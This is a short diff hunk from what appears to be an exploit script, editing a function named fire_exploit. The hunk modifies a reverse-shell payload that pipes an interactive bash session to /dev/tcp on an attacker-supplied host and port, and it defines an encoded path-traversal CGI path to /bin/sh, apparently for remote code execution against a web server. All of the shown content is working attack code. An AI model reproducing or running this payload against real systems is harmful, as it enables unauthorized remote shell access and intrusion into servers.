@@ -74,7 +74,7 @@ def fire_exploit(target_url, lhost, lport, attempt_delay=0):
 
     payload = (
         f"echo Content-Type: text/plain; echo; "
-        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+        f"/bin/bash -c '/bin/bash -i > /dev/tcp/{lhost}/{lport} 2>/dev/null 0>&1'"
     )
     working_path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
 
